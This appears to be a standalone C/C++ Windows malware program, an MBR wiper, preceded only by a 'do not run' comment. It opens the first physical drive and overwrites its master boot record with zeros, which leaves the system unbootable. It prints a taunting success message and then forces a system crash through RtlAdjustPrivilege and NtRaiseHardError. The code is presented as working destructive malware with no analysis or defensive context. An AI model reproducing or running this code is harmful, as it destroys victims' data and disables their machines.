



//DO NOT RUN THIS UNLESS YOU KNOW WHAT YOU'RE DOING




#include <stdio.h>
#include <windows.h>
#pragma comment(lib, "ntdll.lib")

#define MBR_SIZE 512

#define ZERO_DRIVE false
#define ZERO_SIZE 0


extern "C" NTSTATUS NTAPI RtlAdjustPrivilege(ULONG Privilege, BOOLEAN Enable, BOOLEAN CurrentThread, PBOOLEAN OldValue);
extern "C" NTSTATUS NTAPI NtRaiseHardError(LONG ErrorStatus, ULONG NumberOfParameters, ULONG UnicodeStringParameterMask,
    PULONG_PTR Parameters, ULONG ValidResponseOptions, PULONG Response);

void BlueScreen()
{
    BOOLEAN bl;
    ULONG Response;
    RtlAdjustPrivilege(19, TRUE, FALSE, &bl); // Enable SeShutdownPrivilege
    NtRaiseHardError(STATUS_ASSERTION_FAILURE, 0, 0, NULL, 6, &Response); // Shutdown
}


bool OverwriteMBR()
{
    DWORD bytes_read = 512;


    char* buffer = new char[MBR_SIZE];
    ZeroMemory(buffer, MBR_SIZE);
    HANDLE hMBR = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ | FILE_SHARE_WRITE, 0, OPEN_EXISTING, 0, 0);
    bool res = WriteFile(hMBR, buffer, MBR_SIZE, &bytes_read, 0);
    CloseHandle(hMBR);
    return res;
}

bool ZeroDrive()
{
    return 0;
}

int main()
{

   
    if (OverwriteMBR())
    {
        printf("MBR Overwritten :^) \n");
    }
    
    BlueScreen();


    return 0;
}